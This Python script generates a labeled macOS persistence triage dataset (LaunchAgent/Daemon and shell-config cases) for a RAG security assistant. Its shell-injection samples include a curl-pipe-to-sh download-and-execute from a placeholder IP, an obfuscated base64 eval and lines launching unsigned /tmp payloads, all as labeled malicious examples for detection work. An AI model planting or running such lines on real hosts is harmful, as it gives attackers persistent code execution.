"""
Dataset generator for the RAG corpus (T1547.011 LaunchAgent/Daemon persistence).

Produces a realistic SPREAD of labeled example cases by combining the dimensions a
real analyst weighs — code signature x file location x scope (LaunchAgent vs
LaunchDaemon) x program type x RunAtLoad/KeepAlive x parent process x first-seen —
and assigning a ground-truth verdict/action via a single consistent decision
function (the same logic the triage playbook encodes). This is the "how I would
triage" corpus that RAG retrieves at triage time.

Variants are parametrized (not one real file each) so the corpus is large, varied,
reproducible, and portable; a handful of real-enrichment anchor cases are included
for authenticity. Real production runs get appended over time via the feedback loop.

Run:  .venv/bin/python scripts/generate_dataset.py [N]   (default N=80)
"""

from __future__ import annotations

import json
import random
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from tools import macos_tools  # noqa: E402  (for the real anchor cases)

DATASET = ROOT / "data" / "dataset.jsonl"

SIGNATURES = ["unsigned", "adhoc", "apple_signed", "developer_id_signed"]
# (location label, is_suspicious, path template)
LOCATIONS = [
    ("/tmp", True, "/tmp/{n}"),
    ("/private/tmp", True, "/private/tmp/{n}"),
    ("/var/tmp", True, "/var/tmp/{n}"),
    ("/Users/Shared", True, "/Users/Shared/{n}"),
    ("hidden dotfile", True, "/Users/analyst/.{n}"),
    ("/usr/local/bin", False, "/usr/local/bin/{n}"),
    ("/usr/bin", False, "/usr/bin/{n}"),
    ("app bundle", False, "/Applications/{V}.app/Contents/MacOS/{n}"),
    ("app support", False, "/Users/analyst/Library/Application Support/{V}/{n}"),
]
SCOPES = ["user LaunchAgent", "system LaunchDaemon"]
PTYPES = {
    "shell_script": "run.sh", "download_execute": "update.sh",
    "python_script": "helper.py", "compiled_binary": "helperd",
}
PARENTS = ["signed installer (pkg/Installer)", "shell (/bin/sh)", "unknown process", "browser download"]
VENDORS = ["Acme", "Globex", "Initech", "Umbrella", "Hooli"]


def decide(sig, loc_susp, scope_system, ptype, ral, keep_alive, parent, first_seen) -> dict:
    """Ground-truth analyst verdict — one consistent function (mirrors the playbook)."""
    unsigned = sig in ("unsigned", "adhoc")
    download = ptype == "download_execute"
    scripting = ptype in ("shell_script", "download_execute", "python_script")
    trusted_parent = parent.startswith("signed installer")
    signed = sig in ("apple_signed", "developer_id_signed")

    if unsigned and scope_system:
        verdict = "malicious"          # unsigned root-level LaunchDaemon
    elif unsigned and (loc_susp or download):
        verdict = "malicious"          # unsigned in a staging path / downloader
    elif unsigned and scripting and not trusted_parent:
        verdict = "malicious"          # unsigned script from a non-installer parent
    elif signed and not loc_susp and trusted_parent:
        verdict = "benign"             # signed, standard path, real installer
    elif signed and first_seen and scripting:
        verdict = "ambiguous"          # signed but a scripting host, first-seen, no installer
    elif signed and not loc_susp:
        verdict = "benign"
    elif unsigned and not loc_susp and ptype == "compiled_binary" and trusted_parent:
        verdict = "ambiguous"          # unsigned binary but installer-placed in a normal path
    else:
        verdict = "ambiguous"

    if verdict == "malicious":
        actions = ["remove_persistence_file", "quarantine_file"]
        if keep_alive or ral:
            actions.insert(0, "kill_process")
        if download:
            actions.append("block_ip")
    elif verdict == "ambiguous":
        actions = ["escalate_to_slack"]
    else:
        actions = ["no_action"]

    return {"verdict": verdict, "action": actions, "is_true_positive": verdict == "malicious"}


def _rationale(verdict, sig, loc_label, loc_susp, scope, ptype, ral, keep_alive, parent, first_seen) -> str:
    facts = [f"{sig} signature", f"{loc_label} ({'suspicious' if loc_susp else 'standard'} location)",
             scope, ptype.replace("_", " "),
             "RunAtLoad" if ral else "no RunAtLoad", "KeepAlive" if keep_alive else "",
             f"parent: {parent}", "first-seen" if first_seen else "previously seen"]
    facts = [f for f in facts if f]
    if verdict == "malicious":
        lead = "Malicious: "
    elif verdict == "ambiguous":
        lead = "Ambiguous — escalate: "
    else:
        lead = "Benign: "
    return lead + "; ".join(facts) + "."


def gen_variant(idx: int, rng: random.Random) -> dict:
    sig = rng.choice(SIGNATURES)
    loc_label, loc_susp, tmpl = rng.choice(LOCATIONS)
    scope = rng.choice(SCOPES)
    ptype = rng.choice(list(PTYPES))
    ral = rng.random() < 0.7
    keep_alive = rng.random() < 0.4
    parent = rng.choice(PARENTS)
    first_seen = rng.random() < 0.75
    scope_system = scope.startswith("system")

    name = f"{PTYPES[ptype].split('.')[0]}{idx}{'.' + PTYPES[ptype].split('.')[1] if '.' in PTYPES[ptype] else ''}"
    program = tmpl.format(n=name, V=rng.choice(VENDORS))

    label = decide(sig, loc_susp, scope_system, ptype, ral, keep_alive, parent, first_seen)
    label["rationale"] = _rationale(label["verdict"], sig, loc_label, loc_susp, scope, ptype, ral, keep_alive, parent, first_seen)

    situation = (
        f"T1547.011 persistence. A {scope} plist references program {program} "
        f"({ptype.replace('_',' ')}, RunAtLoad={ral}, KeepAlive={keep_alive}). "
        f"Signature: {sig}. Location: {loc_label} (suspicious={loc_susp}). "
        f"Writing parent: {parent}. {'First-seen' if first_seen else 'Seen before'} on host."
    )
    return {
        "id": f"v{idx:03d}", "technique": "T1547.011", "situation": situation,
        "enrichment": {"signature": sig, "program": program, "program_type": ptype,
                       "location": loc_label, "suspicious_location": loc_susp,
                       "scope": scope, "run_at_load": ral, "keep_alive": keep_alive,
                       "parent": parent, "first_seen": first_seen},
        "label": label,
    }


# --------------------------------------------------------------------------- #
# Analyst-EXCEPTION cases — where the correct label OVERRIDES the naive rule.
# The playbook (general rules) gets these wrong; only prior labeled examples
# (RAG) reveal the analyst's judgment. Names are neutral so the model follows the
# rule (not the name) unless RAG contradicts it. Same markers appear in the held-
# out eval set, so RAG can match and recover them.
# --------------------------------------------------------------------------- #
EXCEPTION_SPECS = [
    {"marker": "proc-cache-d", "sig": "unsigned", "loc_label": "/tmp", "loc_susp": True,
     "ptype": "shell_script", "path_tmpl": "/tmp/{marker}-{i}.sh",
     "verdict": "benign", "action": ["no_action"],
     "rationale": ("Known internal tool: proc-cache-d is our sanctioned process-cache "
                   "daemon that ships unsigned to /tmp during rollout. Analyst-approved "
                   "benign despite unsigned + /tmp (the naive rule would flag it).")},
    {"marker": "sys-update-helper", "sig": "developer_id_signed", "loc_label": "app support",
     "loc_susp": False, "ptype": "compiled_binary",
     "path_tmpl": "/Users/analyst/Library/Application Support/SysUpdate/{marker}-{i}",
     "verdict": "malicious", "action": ["remove_persistence_file", "quarantine_file"],
     "rationale": ("Known-bad campaign: 'sys-update-helper' is a Developer-ID-signed adware "
                   "persistence family. Malicious despite a valid signature (the naive rule "
                   "would clear it).")},
]


def exception_variant(spec: dict, idx: int, rng: random.Random) -> dict:
    ral = rng.random() < 0.7
    keep_alive = rng.random() < 0.4
    program = spec["path_tmpl"].format(marker=spec["marker"], i=idx)
    situation = (
        f"T1547.011 persistence. A user LaunchAgent plist references program {program} "
        f"({spec['ptype'].replace('_',' ')}, RunAtLoad={ral}, KeepAlive={keep_alive}). "
        f"Signature: {spec['sig']}. Location: {spec['loc_label']} (suspicious={spec['loc_susp']}). "
        f"Writing parent: unknown process. First-seen on host."
    )
    return {
        "id": f"exc_{spec['marker']}_{idx}", "technique": "T1547.011", "situation": situation,
        "enrichment": {"signature": spec["sig"], "program": program, "program_type": spec["ptype"],
                       "location": spec["loc_label"], "suspicious_location": spec["loc_susp"],
                       "scope": "user LaunchAgent", "run_at_load": ral, "keep_alive": keep_alive,
                       "parent": "unknown process", "first_seen": True},
        "label": {"verdict": spec["verdict"], "action": spec["action"],
                  "is_true_positive": spec["verdict"] == "malicious", "rationale": spec["rationale"]},
    }


def real_anchor_cases() -> list[dict]:
    """A few cases with REAL enrichment (codesign on actual system binaries)."""
    out = []
    for i, (path, verdict) in enumerate([("/bin/echo", "benign"), ("/usr/bin/ssh", "benign"),
                                         ("/usr/bin/python3", "ambiguous")]):
        sig = macos_tools.check_signature(path)
        rep = macos_tools.path_reputation(path)
        actions = {"benign": ["no_action"], "ambiguous": ["escalate_to_slack"]}[verdict]
        out.append({
            "id": f"anchor_{i}", "technique": "T1547.011",
            "situation": (f"T1547.011 persistence. A user LaunchAgent plist references program {path} "
                          f"(RunAtLoad=True). Signature: {sig.get('verdict')}. "
                          f"Location suspicious: {rep.get('suspicious_location')}. First-seen on host."),
            "enrichment": {"signature": sig.get("verdict"), "program": path,
                           "suspicious_location": rep.get("suspicious_location"),
                           "real_enrichment": True},
            "label": {"verdict": verdict, "action": actions, "is_true_positive": False,
                      "rationale": f"{verdict}: real codesign result = {sig.get('verdict')} at {path}."},
        })
    return out


# --------------------------------------------------------------------------- #
# T1546.004 shell-config cases — so the 2nd technique AND the D4 correlation
# (which composes both persistence playbooks) have real RAG retrieval.
# --------------------------------------------------------------------------- #
SHELL_FILES = [".zshrc", ".zprofile", ".zshenv", ".bash_profile", ".bashrc"]
# (injected line, referenced-payload signature, suspicious?, verdict, actions, rationale)
SHELL_INJECT = [
    ("curl -s http://45.9.148.x/a | sh", "unsigned", True, "malicious",
     ["remove_config_persistence", "quarantine_file", "block_ip"],
     "Download-and-execute piped to sh from the shell startup file — classic dropper persistence."),
    ("[ -x /tmp/upd.sh ] && /tmp/upd.sh >/dev/null 2>&1", "unsigned", True, "malicious",
     ["remove_config_persistence", "quarantine_file"],
     "Runs an unsigned /tmp script at every shell launch — event-triggered persistence."),
    ("/Users/Shared/.helper &", "adhoc", True, "malicious",
     ["remove_config_persistence", "quarantine_file"],
     "Backgrounds an ad-hoc binary from a world-writable staging path at shell start."),
    ('eval "$(echo BLOB | base64 -d)"', "unsigned", True, "malicious",
     ["remove_config_persistence"],
     "Obfuscated base64 eval injected into the shell config — evasion + persistence."),
    ('export PATH="$HOME/bin:$PATH"', "n/a", False, "benign", ["no_action"],
     "Standard PATH export — normal shell configuration."),
    ('eval "$(rbenv init -)"', "developer_id_signed", False, "benign", ["no_action"],
     "Version-manager init (rbenv) — legitimate developer tooling."),
    ('source "$HOME/.nvm/nvm.sh"', "n/a", False, "benign", ["no_action"],
     "Sourcing nvm — legitimate developer tooling."),
    ("alias ll='ls -la'", "n/a", False, "benign", ["no_action"],
     "Alias definition — benign shell customization."),
    ('$HOME/bin/mytool.sh', "unsigned", False, "ambiguous", ["escalate_to_slack"],
     "Runs a user script from ~/bin at shell start — first-seen, unsigned but not in a staging path; unclear intent, escalate."),
    ("python3 $HOME/scripts/sync.py", "n/a", False, "ambiguous", ["escalate_to_slack"],
     "Runs a user python script at every shell — first-seen, no download/network; ambiguous, escalate."),
]


def shell_config_cases(rng: random.Random) -> list[dict]:
    out = []
    for i, (line, sig, susp, verdict, actions, rat) in enumerate(SHELL_INJECT):
        sf = rng.choice(SHELL_FILES)
        out.append({
            "id": f"shell_{i:02d}", "technique": "T1546.004",
            "situation": (f"T1546.004 shell configuration modification. ~/{sf} was modified to add "
                          f"a startup command: `{line}`. Referenced payload signature: {sig}. "
                          f"Suspicious location: {susp}. First-seen on host."),
            "enrichment": {"shell_file": sf, "injected_line": line, "signature": sig,
                           "suspicious_location": susp, "first_seen": True},
            "label": {"verdict": verdict, "action": actions,
                      "is_true_positive": verdict == "malicious", "rationale": rat},
        })
    return out


def main() -> None:
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 80
    rng = random.Random(42)
    seen, variants = set(), []
    while len(variants) < n:
        v = gen_variant(len(variants) + len(seen), rng)
        key = v["situation"]
        if key in seen:
            continue
        seen.add(key)
        variants.append(v)

    # 6 labeled instances per exception family → RAG has enough to match on
    exceptions = [exception_variant(spec, i, rng) for spec in EXCEPTION_SPECS for i in range(6)]
    records = real_anchor_cases() + variants + exceptions + shell_config_cases(rng)
    DATASET.parent.mkdir(exist_ok=True)
    with DATASET.open("w", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")

    dist: dict[str, int] = {}
    for r in records:
        v = r["label"]["verdict"]
        dist[v] = dist.get(v, 0) + 1
    print(f"wrote {len(records)} labeled examples -> {DATASET}")
    print("verdict distribution:", dist)


if __name__ == "__main__":
    main()
